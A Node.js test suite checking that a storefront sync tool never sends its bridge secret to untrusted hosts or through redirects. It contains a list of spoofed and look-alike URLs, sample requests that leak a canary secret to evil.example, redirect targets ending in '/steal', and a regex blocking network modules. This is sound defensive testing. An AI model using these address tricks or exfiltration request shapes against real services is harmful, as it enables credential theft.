// SECURITY PROPERTY (black box):
//
//     The bridge secret is NEVER sent to an untrusted host, and NEVER forwarded through a redirect.
//
// These tests do not look at how the code decides. They watch what actually leaves the program:
//   * every request handed to the network layer (the only way the code can send anything), and
//   * every request that arrives at real local HTTP servers, including a "canary" server that must never be contacted.
// So they fail if the property is violated, no matter how many (or how few) host checks exist inside the code, and they keep
// passing if those checks are reorganised. The policy below is written out independently of the code under test.
const test = require("node:test");
const assert = require("node:assert/strict");
const childProcess = require("child_process");
const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const { fetchAllListings, parseArgs, runImport } = require("../tools/import-etsy");
const { parseSyncArgs, runSync } = require("../tools/etsy-sync");

const ROOT = path.join(__dirname, "..");
const NOW = new Date("2026-09-21T12:00:00Z");
const CANARY = "CANARY-9f8e7d6c5b4a-0123456789-abcdefghijklmnop"; // unique, recognisable, and long enough to be a valid secret
const PREVIEW = "dragon-oak-studio-git-storefront-v1-team.vercel.app";

// The policy, restated on purpose (NOT imported from the code): the secret may only ever go to these hosts, plus any host the
// operator explicitly names with --trust-host.
const ALWAYS_TRUSTED = ["dragonoakstudio.com", "www.dragonoakstudio.com", "localhost", "127.0.0.1"];

// ---- The property itself ----------------------------------------------------------------------------------------------

const wireForm = (request) => JSON.stringify({ url: request.url, headers: request.headers, body: request.body === undefined ? null : request.body });
const carriesSecret = (request) => wireForm(request).includes(CANARY);

// Throws if any request that carries the secret (in its address, headers or body) goes to a host outside `allowedHosts`.
const assertSecretOnlySentTo = (requests, allowedHosts, label = "") => {
  requests.forEach((request) => {
    if (carriesSecret(request)) {
      const host = new URL(request.url).hostname;

      assert.ok(allowedHosts.includes(host), `${label} THE SECRET WAS SENT TO AN UNTRUSTED HOST: ${host}`);
    }
  });
};

// ---- Fixtures ---------------------------------------------------------------------------------------------------------

const makeRoot = () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "do-egress-"));

  fs.mkdirSync(path.join(root, "catalog", "products"), { recursive: true });
  fs.writeFileSync(
    path.join(root, "catalog", "collections.json"),
    JSON.stringify({
      schemaVersion: 1,
      collections: ["halloween", "christmas", "cute-bookmarks", "wine-hill-country", "other-seasonal"].map((slug, index) => ({ slug, name: slug, tagline: "t", description: "d", order: index + 1 })),
    })
  );

  return root;
};

// A stand-in for the network layer: records exactly what would leave the program and answers like a healthy bridge.
const recordingFetch = () => {
  const requests = [];
  const impl = async (url, options = {}) => {
    requests.push({ url: String(url), method: options.method, headers: { ...(options.headers || {}) }, body: options.body });

    return { ok: true, status: 200, json: async () => ({ ok: true, connected: true, detail: "full", count: 0, listings: [] }) };
  };

  impl.requests = requests;

  return impl;
};

// Every exported function that is given both a site and the secret. Each takes (site, { fetchImpl, trustHosts }).
const ENTRY_POINTS = {
  fetchAllListings: (site, { fetchImpl, trustHosts }) => fetchAllListings({ site, secret: CANARY, states: ["active"], fetchImpl, trustHosts }),
  runImport: (site, { fetchImpl, trustHosts }) => runImport({ ...parseArgs([]), site, states: ["active"], root: makeRoot(), trustHosts }, { fetchImpl, env: { ADRIAN_BRIDGE_SECRET: CANARY }, now: NOW }),
  runSync: (site, { fetchImpl, trustHosts }) => runSync({ ...parseSyncArgs(["--dry-run", "--root", makeRoot()]), site, states: ["active"], trustHosts }, { fetchImpl, env: { ADRIAN_BRIDGE_SECRET: CANARY }, now: NOW }),
};

const cyrillicI = String.fromCharCode(0x0456);
const HOSTILE_SITES = [
  "https://evil.example",
  "http://evil.example",
  "https://EVIL.EXAMPLE/dragonoakstudio.com",
  "https://evil.example/?next=https://dragonoakstudio.com",
  // Look-alikes of the real host
  "https://dragonoakstudio.com.evil.example",
  "https://www.dragonoakstudio.com.evil.example",
  "https://evil-dragonoakstudio.com",
  "https://dragonoakstudio.co",
  "https://dragonoakstudio.com.",
  "https://shop.dragonoakstudio.com",
  `https://dragonoakstud${cyrillicI}o.com`,
  "https://xn--dragonoakstudo-x5b.com",
  // Address tricks
  "https://dragonoakstudio.com@evil.example",
  "https://dragonoakstudio.com:pw@evil.example",
  "https://evil.example#@dragonoakstudio.com",
  "https://evil.example\\@dragonoakstudio.com",
  "https://localhost.evil.example",
  "http://127.0.0.1.evil.example",
  "https://93.184.216.34",
  "https://0.0.0.0",
  "https://[::1]",
  "http://[::1]:3000",
  // Not web addresses at all
  "ftp://dragonoakstudio.com",
  "//evil.example",
  "evil.example",
  "javascript:alert(1)",
  "",
];

// ---- 1. Untrusted hosts -----------------------------------------------------------------------------------------------

test("the secret is never sent to an untrusted host: every entry point x every hostile address", async () => {
  for (const [name, run] of Object.entries(ENTRY_POINTS)) {
    for (const site of HOSTILE_SITES) {
      const fetchImpl = recordingFetch();

      await Promise.resolve(run(site, { fetchImpl, trustHosts: [] })).catch(() => {
        // Refusing is the expected outcome; whether it refuses or not, what matters is what left the program.
      });

      assertSecretOnlySentTo(fetchImpl.requests, ALWAYS_TRUSTED, `${name} <- ${JSON.stringify(site)}:`);
    }
  }
});

test("an operator-named host receives the secret, and no other host does", async () => {
  for (const [name, run] of Object.entries(ENTRY_POINTS)) {
    const named = recordingFetch();

    await run(`https://${PREVIEW}`, { fetchImpl: named, trustHosts: [PREVIEW] });
    assert.ok(named.requests.length > 0 && named.requests.every(carriesSecret), `${name}: the named host was asked, with the secret`);
    assertSecretOnlySentTo(named.requests, [...ALWAYS_TRUSTED, PREVIEW], name);

    // Naming one host does not open the door to a neighbour, a sub-domain, or a look-alike.
    for (const other of ["https://other-project.vercel.app", `https://x.${PREVIEW}`, `https://${PREVIEW}.evil.example`, "https://evil.example"]) {
      const fetchImpl = recordingFetch();

      await Promise.resolve(run(other, { fetchImpl, trustHosts: [PREVIEW] })).catch(() => {});
      assertSecretOnlySentTo(fetchImpl.requests, [...ALWAYS_TRUSTED, PREVIEW], `${name} <- ${other}:`);
    }
  }
});

test("control: the recorder really does see the secret going to the genuine hosts (so 'nothing was sent' above means something)", async () => {
  for (const [name, run] of Object.entries(ENTRY_POINTS)) {
    for (const site of ["https://dragonoakstudio.com", "https://www.dragonoakstudio.com", "http://localhost:3000", "http://127.0.0.1:8123"]) {
      const fetchImpl = recordingFetch();

      await run(site, { fetchImpl, trustHosts: [] });

      assert.ok(fetchImpl.requests.length > 0, `${name} <- ${site}: a request was made`);
      assert.ok(fetchImpl.requests.every(carriesSecret), `${name} <- ${site}: and it carried the secret`);
      assertSecretOnlySentTo(fetchImpl.requests, ALWAYS_TRUSTED, `${name} <- ${site}:`);
    }
  }
});

test("control: the property check itself fails when the secret is sent to an untrusted host, however it is sent", async () => {
  const violations = [
    { url: "https://evil.example/api", headers: { Authorization: `Bearer ${CANARY}` } },
    { url: `https://evil.example/api?token=${CANARY}`, headers: {} },
    { url: "https://evil.example/api", headers: {}, body: JSON.stringify({ secret: CANARY }) },
    { url: "https://dragonoakstudio.com.evil.example/api", headers: { "x-anything": CANARY } },
  ];

  violations.forEach((request) => assert.throws(() => assertSecretOnlySentTo([request], ALWAYS_TRUSTED), /UNTRUSTED HOST/));

  // ...including a deliberately careless sender that has no host checks of its own.
  const fetchImpl = recordingFetch();

  await fetchImpl("https://evil.example/api", { method: "GET", headers: { Authorization: `Bearer ${CANARY}` } });
  assert.throws(() => assertSecretOnlySentTo(fetchImpl.requests, ALWAYS_TRUSTED), /UNTRUSTED HOST/);

  // And it does not cry wolf about requests that do not carry the secret, or that go to a trusted host.
  assert.doesNotThrow(() => assertSecretOnlySentTo([{ url: "https://evil.example/x", headers: {} }, { url: "https://dragonoakstudio.com/x", headers: { Authorization: `Bearer ${CANARY}` } }], ALWAYS_TRUSTED));
});

// ---- 2. Redirects, over real sockets ------------------------------------------------------------------------------------

const startServer = (handler) =>
  new Promise((resolve) => {
    const requests = [];
    const server = http.createServer((request, response) => {
      requests.push({ url: `http://${request.headers.host}${request.url}`, headers: { ...request.headers }, method: request.method });
      handler(request, response);
    });

    server.listen(0, "127.0.0.1", () => resolve({ server, requests, port: server.address().port, site: `http://127.0.0.1:${server.address().port}` }));
  });

const stopServer = ({ server }) =>
  new Promise((resolve) => {
    server.close(resolve);
    server.closeAllConnections();
  });

const secretFile = () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "do-egress-secret-"));
  const file = path.join(dir, "bridge-secret");

  fs.writeFileSync(file, `${CANARY}\n`);
  fs.chmodSync(file, 0o600);

  return file;
};

const REDIRECT_STATUSES = [301, 302, 303, 307, 308];

// Where a hostile or misconfigured bridge might send us next.
const redirectTargets = (canary) => ({
  "another port on the same machine": `${canary.site}/api/etsy-listings?detail=full`,
  "the same machine by another name": `http://localhost:${canary.port}/steal`,
  "protocol-relative address": `//127.0.0.1:${canary.port}/steal`,
  "the same server again (relative path)": "/api/etsy-listings?detail=full&state=active&limit=100&offset=0",
});

test("the secret is never forwarded through a redirect (real sockets, every redirect type, every entry point)", async (t) => {
  const canary = await startServer((request, response) => {
    response.statusCode = 200;
    response.setHeader("Content-Type", "application/json");
    response.end(JSON.stringify({ ok: true, connected: true, detail: "full", count: 0, listings: [] }));
  });
  let redirect = null;
  const bridge = await startServer((request, response) => {
    response.statusCode = redirect.status;
    response.setHeader("Location", redirect.location);
    response.end();
  });

  t.after(async () => {
    await stopServer(bridge);
    await stopServer(canary);
  });

  const runs = { fetchAllListings: (fetchImpl) => ENTRY_POINTS.fetchAllListings(bridge.site, { fetchImpl, trustHosts: [] }), runImport: (fetchImpl) => ENTRY_POINTS.runImport(bridge.site, { fetchImpl, trustHosts: [] }), runSync: (fetchImpl) => ENTRY_POINTS.runSync(bridge.site, { fetchImpl, trustHosts: [] }) };
  let scenarios = 0;

  for (const [entry, run] of Object.entries(runs)) {
    for (const status of REDIRECT_STATUSES) {
      for (const [where, location] of Object.entries(redirectTargets(canary))) {
        bridge.requests.length = 0;
        canary.requests.length = 0;
        redirect = { status, location };
        scenarios += 1;

        const label = `${entry} / HTTP ${status} -> ${where}:`;

        // Real network layer (Node's own fetch), exactly as the commands use it.
        await assert.rejects(() => run(fetch), undefined, `${label} the command must stop rather than continue past a redirect`);

        assert.equal(canary.requests.length, 0, `${label} nothing may be sent anywhere the bridge redirected to`);
        assert.equal(bridge.requests.length, 1, `${label} the bridge is asked exactly once, and never again through the redirect`);
        assert.ok(carriesSecret(bridge.requests[0]), `${label} (control) the one request to the address the operator chose did carry the secret`);
        assertSecretOnlySentTo([...bridge.requests, ...canary.requests], ALWAYS_TRUSTED, label);
      }
    }
  }

  assert.equal(scenarios, 60);
});

// ---- 3. The real command-line program ---------------------------------------------------------------------------------------

const runCli = (args, env) =>
  new Promise((resolve) => {
    // A clean environment: only what the scenario provides, so nothing from this test process leaks in or out.
    const child = childProcess.spawn(process.execPath, [path.join(ROOT, "tools", "etsy-sync.js"), ...args], { env: { PATH: process.env.PATH, ...env }, stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";

    child.stdout.on("data", (chunk) => (stdout += chunk));
    child.stderr.on("data", (chunk) => (stderr += chunk));
    child.on("close", (code) => resolve({ code, stdout, stderr }));
  });

test("the real `etsy sync` program: a redirect from the bridge is not followed and the secret goes nowhere else", async (t) => {
  const canary = await startServer((request, response) => response.end("{}"));
  const bridge = await startServer((request, response) => {
    response.statusCode = 307;
    response.setHeader("Location", `${canary.site}/steal`);
    response.end();
  });

  t.after(async () => {
    await stopServer(bridge);
    await stopServer(canary);
  });

  const result = await runCli(["--dry-run", "--root", makeRoot(), "--states", "active", "--site", bridge.site], { ADRIAN_BRIDGE_SECRET_FILE: secretFile() });

  assert.equal(result.code, 1);
  assert.equal(canary.requests.length, 0);
  assert.equal(bridge.requests.length, 1);
  assert.ok(carriesSecret(bridge.requests[0]), "(control) the chosen address did receive it");
  assert.ok(!result.stdout.includes(CANARY) && !result.stderr.includes(CANARY), "and the program never printed it");
});

test("the real `etsy sync` program: an untrusted --site is refused before anything is sent", async (t) => {
  const canary = await startServer((request, response) => response.end("{}"));

  t.after(() => stopServer(canary));

  for (const site of ["https://evil.example", "https://dragonoakstudio.com.evil.example", "https://dragonoakstudio.com@evil.example"]) {
    const result = await runCli(["--dry-run", "--root", makeRoot(), "--site", site], { ADRIAN_BRIDGE_SECRET_FILE: secretFile() });

    assert.equal(result.code, 1, site);
    assert.match(result.stderr, /Refusing to send the bridge secret|must use https|username or password/, site);
    assert.ok(!result.stdout.includes(CANARY) && !result.stderr.includes(CANARY), site);
  }

  assert.equal(canary.requests.length, 0);
});

// ---- 4. The property needs the network layer to be the only way out ---------------------------------------------------------

test("the secret can only leave through the network layer that the tests above watch (no other networking code in the tools)", () => {
  ["tools/import-etsy.js", "tools/etsy-sync.js", "tools/bridge-secret.js"].forEach((file) => {
    const source = fs.readFileSync(path.join(ROOT, file), "utf8").replace(/^\s*\/\/.*$/gm, "");

    assert.ok(!/require\(\s*["'](node:)?(http|https|http2|net|tls|dgram|dns|undici|node-fetch|axios|got|request)["']\s*\)/.test(source), `${file} must not open its own connections`);
    assert.ok(!/XMLHttpRequest|WebSocket|sendBeacon|EventSource/.test(source), `${file} must not use other network APIs`);
  });

  // The only program the tools start is Windows PowerShell, with a fixed script, to unlock the local protected file.
  const started = ["tools/import-etsy.js", "tools/etsy-sync.js"].filter((file) => /child_process/.test(fs.readFileSync(path.join(ROOT, file), "utf8")));

  assert.deepEqual(started, []);
});
